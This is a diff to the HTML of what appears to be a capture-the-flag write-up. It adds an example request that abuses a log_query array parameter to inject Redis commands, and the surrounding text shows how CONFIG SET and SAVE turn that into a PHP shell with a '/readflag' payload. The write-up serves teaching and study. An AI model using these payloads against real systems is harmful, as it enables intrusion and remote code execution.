@@ -90,6 +90,7 @@
 <span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
 <span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8">});</span></span></code></pre></div>
 <p>We can bypass the filter by passing <code>log_query</code> as an array, and the <code>.split()</code> call will throw an exception and skip the <code>try</code> block, allowing us to run arbitrary Redis commands.</p>
+<div class="code-block"><span class="lang-tag">text</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0"><code><span class="line"><span>/show_logs?log_query[0]=SET&#x26;log_query[1][]=hacked%201337</span></span></code></pre></div>
 <p>Redis normally stores data in memory, but it can persist to disk using the <code>SAVE</code> command. Furthermore, Redis also allows us to modify the save directory and filename using <code>CONFIG SET</code>.</p>
 <p>We can set the output file to <code>/tmp/shell.php</code>, then write our PHP RCE payload to it.</p>
 <div class="code-block"><span class="lang-tag">text</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0"><code><span class="line"><span>SET a "&#x3C;?=`/readflag`?>"</span></span>
